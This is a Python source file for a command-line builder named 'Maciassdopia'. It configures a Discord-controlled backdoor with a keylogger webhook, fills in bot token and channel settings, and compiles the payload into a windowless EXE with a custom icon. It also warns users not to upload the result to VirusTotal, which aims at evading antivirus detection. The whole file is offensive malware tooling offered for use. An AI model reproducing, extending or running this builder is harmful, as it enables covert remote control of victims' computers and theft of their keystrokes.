
import os
import distro
import subprocess
from sys import platform as OS
from prettytable import PrettyTable

# ========
# Not finished
# We can add telegram bot by the time
# ========

def clear_screeen():
    if OS == "linux" or OS == "linux2":
        os.system("clear")
    else:
        os.system("cls")

clear_screeen()

print('''  
$$\      $$\                     $$\                                     $$\                     $$\           
$$$\    $$$ |                    \__|                                    $$ |                    \__|          
$$$$\  $$$$ | $$$$$$\   $$$$$$$\ $$\  $$$$$$\   $$$$$$$\  $$$$$$$\  $$$$$$$ | $$$$$$\   $$$$$$\  $$\  $$$$$$\  
$$\$$\$$ $$ | \____$$\ $$  _____|$$ | \____$$\ $$  _____|$$  _____|$$  __$$ |$$  __$$\ $$  __$$\ $$ | \____$$\ 
$$ \$$$  $$ | $$$$$$$ |$$ /      $$ | $$$$$$$ |\$$$$$$\  \$$$$$$\  $$ /  $$ |$$ /  $$ |$$ /  $$ |$$ | $$$$$$$ |
$$ |\$  /$$ |$$  __$$ |$$ |      $$ |$$  __$$ | \____$$\  \____$$\ $$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |$$  __$$ |
$$ | \_/ $$ |\$$$$$$$ |\$$$$$$$\ $$ |\$$$$$$$ |$$$$$$$  |$$$$$$$  |\$$$$$$$ |\$$$$$$  |$$$$$$$  |$$ |\$$$$$$$ |
\__|     \__| \_______| \_______|\__| \_______|\_______/ \_______/  \_______| \______/ $$  ____/ \__| \_______|
                                                                                       $$ |                    
                                                                                       $$ |                    
                                                                                       \__|                    
Created by Kiminod_96 and Kermitello
Start by typing `help` \n ''')

settings = ["None", "None", "None", "None", "None"]
payload = ""

def print_a(text:str):
    """Print the text with space above and under it, for better view"""
    print(f"\n{text}\n")

def createTable(settings):
    table = PrettyTable(["Setting", "Value"])
    table.add_row(["Backdoor Name", settings[0]])

    if payload == "discord":
        table.add_row(["Guild ID", settings[1]])
        table.add_row(["Bot Token", settings[2]])
        table.add_row(["Channel ID", settings[3]])
        table.add_row(["Keylogger Webhook", settings[4]])
    else:
        print_a("[!] Please select a payload!")
    return table

try:
    while True:
        command = input(f"[+] {payload} > ")
        command_list = command.split()

        if command_list == []:
            continue
            
        if command_list[0] == "exit":
            print_a("[+] Exiting!")
            exit()

        elif command_list[0] == "use":
            if len(command_list) == 1:
                print_a("[!] Please specify a payload!")
            else:
                if command_list[1] == "discord":
                    print("[+] Using Discord")
                    payload = "discord"
                    table = createTable(settings)
                    print(f"\n{table.get_string(title='Maciassdopia Backdoor Settings')}")
                    print("Run 'help set' for more information\n")
                else:
                    print_a("[!] Invalid payload!")

        elif command_list[0] == "set":
            if len(command_list) < 3:
                print_a("[!] Please specify a setting!")
            else:
                if command_list[1] == "name":
                    settings[0] = command_list[2]
                
                elif command_list[1] == "guild-id":
                    settings[1] = command_list[2]

                elif command_list[1] == "bot-token":
                    settings[2] = command_list[2]

                elif command_list[1] == "channel-id":
                    settings[3] = command_list[2]

                elif command_list[1] == "webhook":
                    settings[4] = command_list[2]

                else:
                    print_a("[!] Invalid setting!")

        elif command_list[0] == "config":
            if payload == "":
                print_a("[!] Please select a payload!")
            else:
                table = createTable(settings)
                print(f"\n{table.get_string(title='Maciassdopia Backdoor Settings')}")
                print("Run 'help set' for more information\n")

        elif command_list[0] == "clear" or command_list[0] == "cls":
            clear_screeen()

        elif command_list[0] == "help":
            if len(command_list) == 1:
                print_a("""
        Help Menu:
                
        "help <command>" Displays more help for a specific command
                
        "use <payload>" Selects a payload to use
                
        "set <setting> <value>" Sets a value to a valid setting
                
        "config" Shows the settings and their values
                
        "build" Packages the backdoor into an EXE file

        "build dev" Running backdoor localy (in cli) for testing purposes
                
        "update" Gets the latest version of Maciassdopia
                
        "exit" Terminates the builder
                        """)
            else:
                if command_list[1] == "use":
                    print_a("""
        Help Menu:
                        
        "use <payload>" Selects a payload to use
                        
        Payloads:
            
        "discord" - A Discord based C2
                            """)
                elif command_list[1] == "set":
                    if payload == "":
                        print_a("[!] Please select a payload!")
                    else:
                        if payload == "discord":
                            print_a("""
        "Help Menu:
                                
        "set <setting> <value>" Sets a value to a valid setting

        Settings:

        "name" - the name of the backdoor
        "guild-id" The ID of the Discord server
        "bot-token" The token of the Discord bot
        "channel-id" - The ID of the Discord channel
        "webhook" = The webhook for the keylogger
                                    """)
                elif command_list[1] == "build" or command_list[1] == "update" or command_list[1] == "exit" or command_list[1] == "config" or command_list[1] == "clear" or command_list[1] == "cls":
                    print_a("[!] There is nothing more to show!")
                else:
                    print_a("[!] Invalid command!")

        elif command_list[0] == "build":
            if payload == "":
                print_a("[!] Select the payload first!")
                continue

            input = input("[?] Are you sure you want to build the backdoor? (y/n) ")
            if input == "y":
                print("[+] Building backdoor...")
                if payload == "discord":
                    f = open("code/discord/main.py", 'r')
                    file = f.read()
                    f.close()
                    newfile = file.replace("{GUILD}", str(settings[1]))
                    newfile = newfile.replace("{TOKEN}", str(settings[2]))
                    newfile = newfile.replace("{CHANNEL}", str(settings[3]))
                    newfile = newfile.replace("{KEYLOG_WEBHOOK}", str(settings[4]))

                f = open(settings[0] + ".py", 'w')
                f.write(newfile)
                f.close()

                if command_list[1] == "dev":
                    if OS == "win32":
                        subprocess.call(["py", settings[0] + ".py"])
                        exit()
                    else:
                        if os.path.exists('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/python.exe'):
                            path_to_python = os.path.expanduser('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/python.exe')
                        else:
                            path_to_python = os.path.expanduser('~/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python38-32/python.exe')
                        
                        if "Arch" in distro.name() or "Manjaro" in distro.name():
                            path_to_python = os.path.expanduser('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/python.exe')
                        
                        subprocess.call(["wine", path_to_python, settings[0] + ".py"])
                        exit()

                # Checking path for pyinstaller.exe
                if OS == "win32":
                    path_to_pyinstaller = 'pyinstaller'
                else:
                    if os.path.exists('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe'):
                        path_to_pyinstaller = os.path.expanduser('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
                    else:
                        path_to_pyinstaller = os.path.expanduser('~/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
                    
                    if "Arch" in distro.name() or "Manjaro" in distro.name():
                        path_to_pyinstaller = os.path.expanduser('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe')

                compile_command = [path_to_pyinstaller, "--onefile", "--noconsole", "--icon=img/exe_file.ico", settings[0] + ".py"]
                
                # linux
                if OS == "win32":
                    subprocess.call(compile_command)
                else:
                    subprocess.call(compile_command.insert(0, "wine"))

                try:
                    os.remove(settings[0] + ".py")
                    os.remove(settings[0] + ".spec")
                except FileNotFoundError:
                    pass

                print('\nThe Backdoor can be found inside the "dist" directory')
                print('\nDO NOT UPLOAD THE BACKDOOR TO VIRUS TOTAL')
                exit()

        elif command_list[0] == "update":
            print_a("[!] Unable to update...\n[!]Function is not done yet.")
            exit()

        else:
            print_a("[!] Invalid command!")

except KeyboardInterrupt:
    print_a("[+] Exiting")
